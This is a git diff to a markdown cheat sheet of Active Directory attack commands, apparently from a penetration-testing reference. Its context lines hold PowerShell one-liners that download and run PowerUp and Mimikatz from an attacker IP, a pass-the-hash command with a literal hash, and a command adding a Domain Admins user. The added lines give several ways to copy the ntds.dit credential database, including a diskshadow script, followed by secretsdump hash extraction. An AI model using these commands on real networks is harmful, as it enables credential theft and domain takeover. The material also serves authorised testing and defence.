@@ -39,6 +39,7 @@ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M met
 powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
 powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
 ```
+* [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)
 
 ## Most common paths to AD compromise
 
@@ -82,35 +83,58 @@ Get-NetGPOGroup
 
 
 ### Dumping AD Domain Credentials (%SystemRoot%\NTDS\Ntds.dit)
-```c
+**Using ndtsutil**
+```powershell
 C:\>ntdsutil
 ntdsutil: activate instance ntds
 ntdsutil: ifm
 ifm: create full c:\pentest
 ifm: quit
 ntdsutil: quit
+```
 
-or
-
+**Using Vshadow**
+```powershell
 vssadmin create shadow /for=C :
 Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit
 ```
+
+**Using DiskShadow (a Windows signed binary)**
+```powershell
+diskshadow.txt contains :
+set context persistent nowriters
+add volume c: alias someAlias
+create
+expose %someAlias% z:
+exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
+delete shadows volume %someAlias%
+reset
+
+then:
+diskshadow.exe /s  c:\diskshadow.txt
+dir c:\exfil
+reg.exe save hklm\system c:\exfil\system.bak
+```
+
+**Extract hashes from ntds.dit**    
 then you need to use secretsdump to extract the hashes
 ```c
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
 
-Metasploit module
+**Alternatives - modules**    
+Metasploit modules
 ```c
 windows/gather/credentials/domain_hashdump
 ```
-
 
 PowerSploit module
 ```
 Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
 ```
+
+
 
 ### Golden Tickets
 Forge a TGT, require krbtgt key
@@ -268,3 +292,4 @@ net group "Domain Admins" hacker2 /add /domain
  * [Pen Testing Active Directory Environments - Part VI: The Final Case](https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/)
  * [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
  *[Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
+ * [DiskShadow The return of VSS Evasion Persistence and AD DB extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
